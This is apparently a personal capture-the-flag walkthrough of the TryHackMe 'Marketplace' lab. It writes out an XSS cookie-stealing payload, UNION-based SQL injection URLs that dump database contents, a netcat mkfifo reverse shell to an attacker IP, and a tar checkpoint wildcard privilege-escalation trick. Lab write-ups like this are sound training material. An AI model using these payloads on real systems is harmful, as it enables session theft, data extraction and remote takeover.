# The Marketplace

This is a write-up for the room on TryHackMe: [https://tryhackme.com/room/marketplace](https://tryhackme.com/room/marketplace)

Nmap scan:&#x20;

```
nmap -T4 -A 10.10.32.69 -oN nmapscan
```

Output of nmap scan:

```c
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 17:22 EDT
Nmap scan report for 10.10.32.69
Host is up (0.20s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.68 seconds
```

I started off by visiting the main page on port 80:

![](<../../.gitbook/assets/image (313).png>)

There is a robots.txt, which was indicated in the nmap scan:

![](<../../.gitbook/assets/image (302).png>)

This leads to the following:

![](<../../.gitbook/assets/image (315).png>)

The same page is visible for the webserver on port 32768:

![](<../../.gitbook/assets/image (318).png>)

I signed up and made a new listing on the site. I then added **\<script>alert(document.cookie)\</script>**, in the title to see if I can get some information:

![](<../../.gitbook/assets/image (310).png>)

I seem to get a token. I found out that this is JWT or JSON Web Token. When I decoded it, this was my result:

![](<../../.gitbook/assets/image (307).png>)

I believe my next step is to change the payload data to have me be the admin, so I am allowed to view the page. I tried to modify the payload as admin, but I ended up failing. I found [this write-up](https://www.security-hive.com/post/tryhackme-the-marketplace-walkthrough), that led me to a website: [https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md). Using the github link, I first **ran the python script** mentioned in the github page, and then I tried the first option:

![](<../../.gitbook/assets/image (301).png>)

I then got this response from the website:

![](<../../.gitbook/assets/image (293).png>)

I then tried it again, this time removing the alert box code:

![](<../../.gitbook/assets/image (316).png>)

I then submitted the listing. Based on the hint from TryHackMe, I then reported this listing to the admins.&#x20;

![](<../../.gitbook/assets/image (306).png>)

At this point, I realized that I was making a mistake, and that I was entering the IP of the server itself, and not my own IP from TryHackMe. I then corrected my javascript:

![](<../../.gitbook/assets/image (296).png>)

When I reported it this time to the admin, I got the cookie using the python script from the GitHub page:

![](<../../.gitbook/assets/image (300).png>)

I entered this in [jwt.io](https://jwt.io/#debugger-io), and got the following result:

![](<../../.gitbook/assets/image (299).png>)

We can see the username of the admin is michael. I then logged out of the account. I then logged in using credentials I had made previously, **test:test**, and when the following prompt came up in burpsuite (I used the burpsuite browser for this part), I modified it to use the cookie of the admin:&#x20;

![](<../../.gitbook/assets/image (320).png>)

I was then in:

![](<../../.gitbook/assets/image (311).png>)

In order to access **/admin**, you have to manually force the admin cookie in bupsuite. After I did that, I got to the following site:

![](<../../.gitbook/assets/image (319).png>)

I did the same for the **Administration Panel**, and got the first flag:

![](<../../.gitbook/assets/image (314).png>)

I see that jake is also an administrator. After a while, viewing [this write-up](https://www.security-hive.com/post/tryhackme-the-marketplace-walkthrough), made me realize that I should focus more on the SQL Injection than the user jake. Using the same write-up I ended up finding about the following web query:

```c
http://10.10.8.149/admin?user=-2+union+select+1,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),3,4
```

This led to the output that tolds what table names there are:

![](<../../.gitbook/assets/image (317).png>)

Running the following web query led to the column names:

```c
http://10.10.8.149/admin?user=-2+union+select+1,(SELECT+group_concat(column_name)+from+information_schema.columns+where+table_schema=database()),3,4
```

![](<../../.gitbook/assets/image (322).png>)

From the write-up, the author then went on to make this query:

```c
http://10.10.8.149/admin?user=-2+union+select+1,(SELECT+message_content+FROM+messages+WHERE+ID=1),3,4
```

This led to the following output:

![](<../../.gitbook/assets/image (309).png>)

This seems to be the SSH password for a user. The credentials worked for jake:

![](<../../.gitbook/assets/image (298).png>)

The user.txt file was in the directory you enter in:

![](<../../.gitbook/assets/image (304).png>)

I then ran **sudo -l** to find out what actions we have as a sudoer:

![](<../../.gitbook/assets/image (321).png>)

I found out we have a file we have access to read. We do not have access to edit the file. I found [this website](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/), based on a couple of the write-ups I had read online, that talked about exploiting wildcards for privilege escalation. I followed the commands from the website:

I first ran `cat /etc/cron` and got the following output:

![](<../../.gitbook/assets/image (295).png>)

There does not seem to be anything of importance here, so I moved on to the next step, which was creating a msfvenom payload:

![](<../../.gitbook/assets/image (294).png>)

We then copy the **mkfifo** output (previous image) into the jake user's shell (in the **/opt/backups** directory). I then ran the following commands, going off of [this write-up](https://yebberdog.medium.com/tryhackme-the-marketplace-writeup-3397db0c6dfb):

```c
echo "mkfifo /tmp/rtez; nc 10.2.54.229 4444 0</tmp/rtez | /bin/sh >/tmp/rtez 2>&1; rm /tmp/rtez" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
sudo -u michael ./backup.sh
```

{% hint style="warning" %}
I ran into an issue here where I was not able to backup the files. I kept getting an error, in order to fix it, I moved **backup.tar** to **bkup.tar**. I then ran the **sudo** command once again and got the reverse shell. Source: [https://www.infosecarticles.com/tryhackme-the-marketplace-walkthrough/](https://www.infosecarticles.com/tryhackme-the-marketplace-walkthrough/)
{% endhint %}

After I ran the aforementioned commands, I had a reverse shell:

![](<../../.gitbook/assets/image (312).png>)

I then spawned a python shell here running the following command, from [this website](https://netsec.ws/?p=337):

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

After I got the shell, I tried to run **sudo -l**, but that did not work out for me. I had to get the shell again and start over. I read [a write-up](https://www.infosecarticles.com/tryhackme-the-marketplace-walkthrough/) and found out we are part of the docker group. I also found out that I made a mistake copying a command from GTFOBins (for the **docker** command):

![](<../../.gitbook/assets/image (297).png>)

I was not supposed to use sudo for this. I was then able to get the flag:

![](<../../.gitbook/assets/image (305).png>)

